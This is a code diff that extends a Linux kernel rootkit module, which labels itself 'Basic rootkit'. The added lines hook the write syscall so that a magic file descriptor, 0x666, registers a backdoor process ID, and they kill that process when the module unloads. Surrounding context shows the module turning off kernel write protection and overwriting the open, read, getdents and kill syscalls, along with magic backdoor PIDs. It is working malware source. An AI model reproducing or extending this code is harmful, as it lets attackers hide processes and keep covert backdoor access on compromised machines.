@@ -34,10 +34,12 @@ MODULE_DESCRIPTION("Basic rootkit");
 #define BACKDOOR_PATH       "/home/antoine/Perso/rootkit/backdoor"
 #define MAGIC_AUTH_PID      1234
 #define MAGIC_BACKDOOR      1235
+#define FD_HACK_BACKDOOR    0x666
 #define MAX_PIDS            8
 #define MIN(a,b)            ((a < b) ? a : b)
 #define MAX_LINE_LEN        512
 
+static pid_t pid_backdoor = 0;
 static pid_t authorized_pids[MAX_PIDS] = {0};
 static size_t authorized_pids_cnt = 0;
 
@@ -334,6 +336,16 @@ asmlinkage int fake_sys_open(const char *pathname, int flags)
     return fd;
 }
 
+asmlinkage ssize_t fake_sys_write(int fd, const void *buf, size_t count)
+{
+    if(fd == FD_HACK_BACKDOOR)
+    {
+        pid_backdoor = *(pid_t*)buf;
+        return -1;
+    }
+    return original_sys_write(fd, buf, count);
+}
+
 asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 {
     int     i = 0, j = 0, skip = 0;
@@ -528,6 +540,7 @@ static int __init lkm_init(void)
     original_sys_getppid    = sys_call[__NR_getppid];
     write_cr0(read_cr0() & (~0x10000));
     sys_call[__NR_open]     = fake_sys_open;
+    sys_call[__NR_write]    = fake_sys_write;
     sys_call[__NR_read]     = fake_sys_read;
     sys_call[__NR_getdents] = fake_sys_getdents;
     sys_call[__NR_kill]     = fake_sys_kill;
@@ -538,8 +551,13 @@ static int __init lkm_init(void)
 
 static void __exit lkm_exit(void)
 {
+    //Do not forget to kill backdoor
+    if(original_sys_kill(pid_backdoor, SIGKILL) == 0)
+        printk("%s Successful send SIGKILL to backdoor[%d]", __this_module.name, pid_backdoor);
+
     write_cr0(read_cr0() & (~0x10000));
     sys_call[__NR_open]     = original_sys_open;
+    sys_call[__NR_write]     = original_sys_write;
     sys_call[__NR_read]     = original_sys_read;
     sys_call[__NR_getdents] = original_sys_getdents;
     sys_call[__NR_kill]     = original_sys_kill;
